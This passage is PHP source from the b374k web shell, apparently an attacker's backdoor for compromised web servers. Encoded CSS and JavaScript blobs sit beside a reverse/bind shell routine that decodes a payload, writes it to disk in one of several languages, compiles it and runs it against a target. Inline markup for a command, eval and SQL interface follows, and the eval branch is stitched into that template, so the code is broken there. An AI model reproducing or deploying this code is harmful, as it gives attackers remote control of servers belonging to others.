VfsxGAyGd8d8Y6OgUkrJdh8JBIIRjPFOY1NV7adAINgRCATeOKC8vejSpZfs5pa8+0MAUGSM7RmnlmXlZ2d/m7AsKw8AIEmSMjHx3KwkSUpTovEA4D8gwQkPAJXGpf2mZQAh1JzBpOlXGCHUjhCSW+zOFWzbdg6eEGzbXseVSnnxSRGoVMqLWNfNm42BctIghmHcxJqWu0UpOfEwUErVfF6bwYWCmdZ1Y/qkCei6Pm0YRhoTQkgqtfoVpdR0vGMhwKIoKZIkRSRJioiipCDkfJRTSo1UavVLQgjhG2wW83nt20gk+o6TnUAQxNDY2PgMY4w2yhILghByat80jW8Mw0jubESMMVaplJORSHRcEIQzDiYZ4jjOw/O8l+d5L8dxHtTcLPbB5mb9z0Ri4a16vV7ZsxNallWtVqt/xWKxixjj0GNJe0LuLSzMTxmGfv8/t+JarapubW3Ny7Ly7HGTsG373srK8lQ2u3Zn37UcAKBYLP5tWZtzPp9vUBDEM8egDWi1Wp1bXExMZbNrdw4UJrtIqLmcel0UJdvj8Z7HGLmPVuvEWFtb+zyRWHh7Y6Nw/yjilJNlpSFO5RcwxjGH4nRd1/VfdolTciR13CTPu8Lh8POyLE96vafiPM9HAWB7kS3btp2rVMpJ0zRvqKp6yzSNjBN5/g/C3ULDeIdIrQAAAABJRU5ErkJggg==";
$s_dark_cb = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAA8AAAAeCAYAAADzXER0AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAASdJREFUeNrsk0GKwjAYhZNJqYviQpDKLOcY3sOFIF5DFF0KgjeYAwizmDuNOxHcFrGlje9pA1KbNOqshvnh2YD58v6m75dxHIdCiAk0gt5Fc+2gDbQO8DNTSk1D1BtKSikoWxVF0U7TdJ5lmSI8BtfCARKsoFyw1poeLcBjwl0aEgqCwAma4n5yhC+AceSzqdD69RAD+zjedSBeqH/4CfiA74bgaG+o3HxQURR1sOgjnqpMDv+0ikZJkpzyPP9kwlbIaQgNsO55GO+hb2hp3vnI1Hl2XZT7xe+PJNbWYWgcyao7L+p22h4ayephdyPJVl3v+jFcuhNmg+tAazxvN9tA86m83H6+Fm5n3mpd49sSlDaYN3jJb8WFazMy2rftujb/yEieBRgAZHG/OeGef6MAAAAASUVORK5CYII=";
$s_bright_cb = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAA8AAAAeCAYAAADzXER0AAAACXBIWXMAAAsSAAALEgHS3X78AAABP0lEQVQ4je2TsUoDQRCGv5m93RRBLBIQO/NOFgHJa4iiZUDwNUSx8J0s5SCFkkJy3M5aJBfwLrm7oI3gD8sWO9/+O+z8kud5AC6BC+CUbr0Bj8B9BlzHGK+KoghmpiklUkp7SVU9CiHceO9dBsyKohjEGMXMMLNWWETUzAbe+1kGjM1MzIyyLFvBSmYmwDgDSCltHc2sE1bV9V7BfRwblxxM/MM/gxeqmkSkNyQiCVgo8BBCWDnnkoigqq3LOZeGw+EKeMqAO+998N6fAyc9jHPgBZhXPX8C3XO5lm3q+f1Ixhh3QUCPSNbdReRb2g6KZP2yRiRjjK29vj7fNlupO/QFG/Cu4n0grL+ql9tkOm93FhF2PfxsA9bPtrCqIiJIzWUynVNFph4dyfP8fblcHpdlSTUkXVJVRqPRxx+N5BfD5OFvXtL9jAAAAABJRU5ErkJggg==";
$s_style = "rVbLjpswFP0VqqhSH4AgSTMzoH5Cl11VXRgwwRqwkTGdZBD/Xj/BgJNppbE3Drm+z3PP9ZehJJgFJWhQfU1+Zj1mvfeDYOJ3kKIyHTNSXIcM5M9nSnpcJLtIrlRe69ArTOJ9e0lzUhOa7Eq51J8vEJ0rlhy58FjRISO0gDSJ24vXkRoV3m4vVzqCwdw+y0PK4IUFBcwJBQwRnGCCIRdLKvIH0mFpamwpHFpQFAifk8h75L6MJaHNUKCurcE1QbhG4joDWQ09VvntkPe04yoKWIK+Zum4awDCiyBjudKgIa+BcjygoEB9l8QRt+D49IIKVvFj9DE13vC8KH92FQRcfpBxgRqdcVLDkqUNoGeEk2i6EU2yHiuGe39X8TBXYC8c4PnOnhELGAW4ExlIKGGAwU9BfAgPDwU8f1bx3BO4b9IDfggvLU8/rFHHVD08sK7IroG4d6XTaPdEZo4yMxR2vATDfyR6iyMDG1HnoFKoi09CdOuCdhXINTukgGOCPprChSJ0hEui0RuIsrlMa0UnS4mIUSiWnihNLKs7j9FB+7gXKeAZZCgHtcZFg4qi5mgNz+DKs23jXZuye+tB9JYUepfq15AxHmTXglxHwLWLYjZoUc79k9jpv3StQ+WKOd7Fcwd+jhv4iC8bgM+1VoFqkrHDPZzEvu3oW37O/48hwm3PXv2wpaRpmR+yCwMUAle3aKBHJoqMMEYaG32HJ7HvU7EFR25emR22GDJ+WDSmUXp4iORV5XnWs2Flb+H6k9hrZNyk/qn/JBkYbhkcXCrKFM0inHTcQ2IS4Px5M2/aus0Xrl5kpE1Xk2VWX22SuOgQZcHcPk0gm+5TB9DiR7E/oKYllAHMJ1PYwYbP5CuaxpkM00XToeApT045O4HLFjjdJVCtVuXaqH7U1RfKK5/HvfXYwUlK/u0aaMlqbw/HHGJOGjauv61xlou9ZpfTpuWtL1sXXGEv5kAczbFPUy6XS9Augi8lcmb7ZrjWwFGQN0r+JVeOxNvotQfPUnnOE8lTOj2T4ngmvWtGLu8zfm+n8bg0J6p9M9ajXGsG2QLeMx2JCUPlApTmktahH6xbYKxRq40cFvDXvnv72diMBa16DEtC2PKBR4VaG8IieY5pqDWtCGP9bPBV5vjJRtsoOfkXu7bwe17B/JmL/A7zrgvML++rV4MM1vKjPBkQqKeMfDmaJ5NosuWrOchqkj8vH1bLVgwobCFgnJb0yf6vJR2S3MyrdeOho5/iLUGy5d+OKJEHWDgic1sOpMeqi33NNrE5UP9Ng0vmHf8C";
$s_mime_types = "dZThdqMgEIX/7zn7DvMC2jZ62t3HmQgaGkepCDFvvxeNis32xx3huwMYmUkwSvcvRWMtIfz+Fbb5CeC0gsvp/Y1iSEARQZGAMoJyBZ9WN/Rpm7ADoUWNrEw+T7TIbmeJLemhgNCUu4EdH2EekLwh47Sd0DcN9fuBX95U19GIpq+RpN946FSudKXziyIfLlC4PHnSn02r4Un05cm3ca2Nnn3yXPRc9NyTN0+jFXV8pXDO63gmBimvw0hQiuJH8ENLMnmS0h8sl9mW74Nmdc9FK8O5vQeC0iyc7fP4kX3w8UUOWwQTekJY2U2fhWJYwZTVuBooAa0hKAXIaJMMibeZLhEeh95dmeQK51ooBJfYHe64axLgMnY1LZoOPPRngg7shneWbyQAhW9sAjvudgtg4cCWW+OQ/EDXmAxFZTTNMTFwjIvHsFemf2FlKyHEFZzZmYrYk+vUysQoQwg0D6480CBmM5dm4H2+tAC+HLoUioMCjYBnsWUtzcAUn85OK3aFELRNTXslhHW+1ek8RWlwLA8+2KYxI7fZzXTKke6Pawcm6IBGR9A3FJsPj4tKeesr3Y156E2lqQ029f5b2IzCPhzWeT1wjh/Q2vLP6yttox+SPsqPR1Ic/ZD0933dKY7SpMFYgla0dsr2SlPGjLvmKgGmRgGbWXNIvIprgnZQt1gew46StkmO2f4RCp9A1DKjlnk6MmHUfLLYdhk+a7tc+cBCww8mbsA3pkNx2j3hxmgr3up9EprkHw==";
// http://www.kryogenix.org/code/browser/sorttable/ - SortTable (c) Stuart Langridge
$s_sortable_js = "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";
// https://github.com/ded/domready - domready (c) Dustin Diaz
$s_domready_js = "VVJNb9swDP0riQ6GBAjOetglheBD19uGHrpbkAKaRFcqZMmQ6HSB5/8+2mm+Lpb5yPf4SGndDtGgT5GDRDHisYfUrrpkhwBrxYZoofURLGtOWA1/+5SxKORi+1V9KlGKnbVYVd2lat1ZSqc/H2CQNSeQIwk4X3awn8UmzmzqMmh7ZPJqSozn/1U/R049PH46H4CDwro43xJXAPEPOq9Q7fYyyqzWD9Irm8zQQURZlK/PwXOABUuqEPZqcgpBDor9ePn1lCJS6mfSlgaWWjFt7fNhhnyhDGRyRmPExWVBjWCcju/AZFBsAV9nkEmjUrN5C4vQvzez2V4Cs5FOmRqhIPe7sBePGXDIceV3el9V85cPMqrLBsTo6wxdOsCdk7lIZiF7mnw+E3FrjaiNW+p4ey+yIRc3XauK00rgrnwRE5OQQO4v1CjGAqFdK0x945o4X3vdD8VRZnvTAPNxvG6UswAtMjEZjcbRVY9fYxbA376DNFDLKxlIbJLfv4kpzi9BTNvbF+AauHYFMU3iPw==";

// magic quote and shit :-p
function clean($arr){
	$quotes_sybase = strtolower(ini_get('magic_quotes_sybase'));
	if(function_exists('get_magic_quotes_gpc') && get_magic_quotes_gpc()){
		foreach($arr as $k=>$v){
			$arr[$k] = (empty($quotes_sybase) || $quotes_sybase === 'off')? stripslashes($v) : stripslashes(str_replace("\'\'", "\'", $v));
		}
	}
	return $arr;
}
// addslashes if on windows
function adds($s_s){
	global $s_win;
	return ($s_win)? addslashes($s_s):$s_s;
}
// add slash to the end of given path
function cp($s_p){
	global $s_win;
	if(@is_dir($s_p)){
		$s_x = DS;
		while(substr($s_p, -1) == $s_x) $s_p = rtrim($s_p, $s_x);
		return ($s_win)? preg_replace("/\\\\+/is", "\\", $s_p.$s_x):$s_p.$s_x;
	}
	return $s_p;
}
// make link for folder $s_cwd and all of its parent folder
function swd($s_p){
	global $s_self;
	$s_ps = explode(DS,$s_p);
	$s_pu = "";
	for($s_i = 0; $s_i < sizeof($s_ps)-1; $s_i++){
		$s_pz = "";
		for($s_j = 0; $s_j <= $s_i; $s_j++) $s_pz .= $s_ps[$s_j].DS;
		$s_pu .= "<a href='".$s_self."cd=".$s_pz."'>".$s_ps[$s_i]." ".DS." </a>";
	}
	return trim($s_pu);
}
// htmlspecialchars
function hss($s_t){
	return htmlspecialchars($s_t, 8);
}
// add quotes
function pf($f){
	return "\"".$f."\"";
}
// replace spaces with underscore ( _ )
function cs($s_t){
	return str_replace(" ", "_", $s_t);
}
// trim and urldecode
function ss($s_t){
	return rawurldecode($s_t);
}
// return tag html for notif
function notif($s){
	return "<div class='notif'>".$s."</div>";
}
// bind and reverse shell
function rs($s_rstype,$s_rstarget,$s_rscode){
	// resources $s_rs_pl $s_rs_py $s_rs_rb $s_rs_js $s_rs_c $s_rs_java $s_rs_java $s_rs_win $s_rs_php
	$s_result = $s_fpath = "";
	$s_fc = gzinflate(base64_decode($s_rscode));

	$s_errperm = "Directory ".getcwd().DS." is not writable, please change to a writable one";
	$s_errgcc = "Unable to compile using gcc";
	$s_errjavac = "Unable to compile using javac";

	$s_split = explode("_", $s_rstype);
	$s_method = $s_split[0];
	$s_lang = $s_split[1];
	if($s_lang=="py" || $s_lang=="pl" || $s_lang=="rb" || $s_lang=="js"){
		if($s_lang=="py") $s_runlang = "python";
		elseif($s_lang=="pl") $s_runlang = "perl";
		elseif($s_lang=="rb") $s_runlang = "ruby";
		elseif($s_lang=="js") $s_runlang = "node";
		$s_fpath = "b374k_rs.".$s_lang;
		if(@is_file($s_fpath)) unlink($s_fpath);
		if($s_file = fopen($s_fpath, "w")){
			fwrite($s_file, $s_fc);
			fclose($s_file);
			if(@is_file($s_fpath)){
				$s_result = exe("chmod +x ".$s_fpath);
				$s_result = exe($s_runlang." ".$s_fpath." ".$s_rstarget);
			}
			else $s_result = $s_errperm;
		}
		else $s_result = $s_errperm;
	}
	elseif($s_lang=="c"){
		$s_fpath = "b374k_rs";
		if(@is_file($s_fpath)) unlink($s_fpath);
		if(@is_file($s_fpath.".c")) unlink($s_fpath.".c");
		if($s_file = fopen($s_fpath.".c", "w")){
			fwrite($s_file,$s_fc);
			fclose($s_file);
			if(@is_file($s_fpath.".c")){
				$s_result = exe("gcc ".$s_fpath.".c -o ".$s_fpath);
				if(@is_file($s_fpath)){
					$s_result = exe("chmod +x ".$s_fpath);
					$s_result = exe("./".$s_fpath." ".$s_rstarget);
				}
				else $s_result = $s_errgcc;
			}
			else $s_result = $s_errperm;
		}
		else $s_result = $s_errperm;
	}
	elseif($s_lang=="win"){
		$s_fpath = "b374k_rs.exe";
		if(@is_file($s_fpath)) unlink($s_fpath);
		if($s_file = fopen($s_fpath,"w")){
			fwrite($s_file,$s_fc);
			fclose($s_file);
			if(@is_file($s_fpath)){
				$s_result = exe($s_fpath." ".$s_rstarget);
			}
			else $s_result = $s_errperm;
		}
		else $s_result = $s_errperm;
	}
	elseif($s_lang=="java"){
		$s_fpath = "b374k_rs";
		if(@is_file($s_fpath.".java")) unlink($s_fpath.".java");
		if(@is_file($s_fpath.".class")) unlink($s_fpath.".class");
		if($s_file = fopen($s_fpath.".java", "w")){
			fwrite($s_file,$s_fc);
			fclose($s_file);
			if(@is_file($s_fpath.".java")){
				$s_result = exe("javac ".$s_fpath.".java");
				if(@is_file($s_fpath.".class")){
					$s_result = exe("java ".$s_fpath." ".$s_rstarget);
				}
				else $s_result = $s_errjavac;
			}
			else $s_result = $s_errperm;
		}
		else $s_result = $s_errperm;
	}
	elseif($s_lang=="php"){
		$s_result = eval("?><?php echo $s_title; ?><?php echo $s_favicon; ?><?php echo $s_color[0]; ?><?php echo $s_color[1]; ?><?php echo $s_color[2]; ?><?php echo $s_color[3]; ?><?php echo $s_color[1]; ?><?php echo $s_color[4]; ?><?php echo $s_color[1]; ?><?php echo $s_color[4]; ?><?php echo $s_color[3]; ?><?php echo $s_color[4]; ?><?php echo $s_color[5]; ?><?php echo $s_color[3]; ?><?php echo $s_color[3]; ?><?php echo $s_color[6]; ?><?php echo $s_color[3]; ?><?php echo $s_color[7]; ?><?php echo $s_color[4]; ?><?php echo $s_color[7]; ?><?php echo $s_color[1]; ?><?php echo $s_color[8]; ?><?php echo $s_color[3]; ?><?php echo $s_color[2]; ?><?php echo $s_color[3]; ?><?php echo $s_color[0]; ?><?php echo $s_color[2]; ?><?php echo $s_color[2]; ?><?php echo $s_color[8]; ?><?php echo $s_color[3]; ?><?php echo $s_color[8]; ?><?php echo $s_color[2]; ?><?php echo $s_color[8]; ?><?php echo $s_color[3]; ?><?php echo $s_color[10]; ?><?php echo $s_color[2]; ?><?php echo $s_color[2]; ?><?php echo $s_color[8]; ?><?php echo $s_color[3]; ?><?php echo $s_color[9]; ?><?php echo $s_color[3]; ?><?php echo $s_color[3]; ?><?php echo $s_color[0]; ?><?php echo $s_color[0]; ?><?php echo $s_color[2]; ?><?php echo $s_checkbox; ?><?php echo $s_favicon; ?><?php echo $s_color[1]; ?><?php echo $s_color[11]; ?><?php echo $s_color[12]; ?><?php echo $s_color[3]; ?><?php echo $s_color[7]; ?><?php echo $s_color[7]; ?><?php echo $s_arrow; ?><?php if($s_auth){?><?php echo $s_self; ?><?php echo $s_self; ?><?php echo $s_self."cd=".cp(dirname(realpath($_SERVER['SCRIPT_FILENAME']))); ?><?php echo $s_ver; ?><?php echo $s_info; ?><?php echo $s_self; ?><?php echo $s_self; ?><?php echo $s_self; ?><?php echo $s_self; ?><?php echo $s_self; ?><?php echo $s_self; ?><?php echo $s_prompt; ?><?php echo $s_self; ?><?php
if(isset($_GP['cmd'])) echo "";
else echo "- shell command -";
?><?php echo $s_result; ?><?php } else{ ?><?php echo $s_self; ?><?php echo $s_favicon; ?><?php echo $s_ver; ?><?php }?><?php echo @date("Y",time())." "; ?><?php echo gzinflate(base64_decode($s_sortable_js)).gzinflate(base64_decode($s_domready_js)); ?><?php echo adds($s_cwd); ?><?php if(isset($_GP['cmd'])) echo "if(d.getElementById('cmd')) d.getElementById('cmd').focus();"; ?><?php if(isset($_GP['evalcode'])) echo "if(d.getElementById('evalcode')) d.getElementById('evalcode').focus();"; ?><?php if(isset($_GP['sqlcode'])) echo "if(d.getElementById('sqlcode')) d.getElementById('sqlcode').focus();"; ?><?php if(isset($_GP['login'])) echo "if(d.getElementById('login')) d.getElementById('login').focus();"; ?><?php if(isset($_GP['hexedit'])) echo "showhex();"; ?><?php echo adds($s_self); ?><?php if(isset($_GP['x']) && ($_GP['x']=='ps')) echo "ps"; ?><?php die(); ?>